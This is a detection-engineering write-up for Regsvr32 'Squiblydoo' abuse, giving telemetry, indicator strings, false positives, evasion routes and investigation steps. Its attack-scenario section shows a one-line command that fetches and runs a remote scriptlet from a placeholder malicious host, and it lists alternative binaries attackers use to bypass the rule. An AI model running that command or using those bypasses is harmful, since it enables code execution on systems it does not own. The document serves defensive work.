# DET-009 - Regsvr32 Remote Script Execution

## Detection ID

DET-009

## Status

Draft

## Version

1.0

## Confidence

High

## Severity

High

---

# Threat Overview

Regsvr32.exe is a legitimate Microsoft utility used to register and unregister Dynamic Link Libraries (DLLs). Attackers abuse Regsvr32 to execute remote scriptlets (.sct) using the Squiblydoo technique, allowing malicious code execution through a trusted Windows binary.

This technique enables attackers to execute code without introducing a new executable and often bypasses traditional application allowlisting.

---

# MITRE ATT&CK Mapping

| Tactic | Technique |
|---------|-----------|
| Defense Evasion | T1218.010 – Regsvr32 |
| Command and Control | T1105 – Ingress Tool Transfer |

---

# Attack Scenario

An attacker executes:

regsvr32.exe /s /n /u /i:http://malicious-site/payload.sct scrobj.dll

Regsvr32 downloads the remote scriptlet and executes it through scrobj.dll, allowing attacker-controlled code to run without launching a custom executable.

---

# Required Telemetry

| Source | Event |
|---------|-------|
| Sysmon | Event ID 1 |
| Windows Security | Event ID 4688 |

Important fields:

- Image
- CommandLine
- ParentImage
- User
- ProcessGuid

---

# Detection Logic

Generate an alert when Regsvr32 executes a remote scriptlet.

Indicators include:

- regsvr32.exe
- /i:
- scrobj.dll
- http://
- https://

---

# False Positives

Potential legitimate activity includes:

- Enterprise COM registration
- Administrative DLL registration
- Software installation and maintenance

Remote scriptlet execution should be uncommon in most enterprise environments.

---

# Bypass Opportunities

Attackers may evade this detection by:

- Using Mshta.exe
- Using Rundll32.exe
- Using PowerShell
- Using WMI
- Executing local scriptlets

---

# Investigation Guide

When this detection triggers:

1. Review the complete command line.
2. Identify the remote URL.
3. Retrieve the referenced scriptlet.
4. Review the parent process.
5. Determine whether additional payloads were downloaded.
6. Review child processes.
7. Correlate with previous detections.

---

# Related Detections

- DET-002 – PowerShell Remote Content Retrieval
- DET-005 – Suspicious Parent Process
- DET-007 – Certutil Remote Download
- DET-008 – Rundll32 Suspicious DLL Execution

---

# Future Improvements

- Threat intelligence enrichment
- Parent process scoring
- Scriptlet reputation analysis
- Process ancestry correlation
- LOLBin behavioral clustering